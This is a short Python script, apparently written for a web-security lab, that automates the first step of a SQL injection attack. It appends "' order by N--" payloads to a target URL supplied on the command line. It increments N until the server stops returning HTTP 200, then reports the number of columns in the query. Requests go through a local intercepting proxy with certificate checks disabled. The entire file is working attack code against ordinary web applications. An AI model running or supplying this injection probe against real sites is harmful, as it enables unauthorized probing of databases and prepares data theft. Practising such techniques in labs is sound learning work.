import requests
import urllib3
import sys

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def make_payload(number):
    return ("' order by " + str(number) + "--")

def number_of_colunms(url, uri)->int:
    print("here")
    number_of_columns : int = 1
    request_string : str = url + uri 
    response = requests.get( request_string + make_payload(number_of_columns), verify = False, proxies = proxies)

    while(response.status_code == 200):
        number_of_columns += 1
        response = requests.get(request_string + make_payload(number_of_columns), verify = False, proxies = proxies)
        
    return number_of_columns - 1


def main():

    try:
        url = sys.argv[1]
        uri = sys.argv[2]
    except IndexError:
        print("[-] usage : %s <url> <uri>" % sys.argv[0])
        exit(1)

    print(number_of_colunms(url, uri))

main()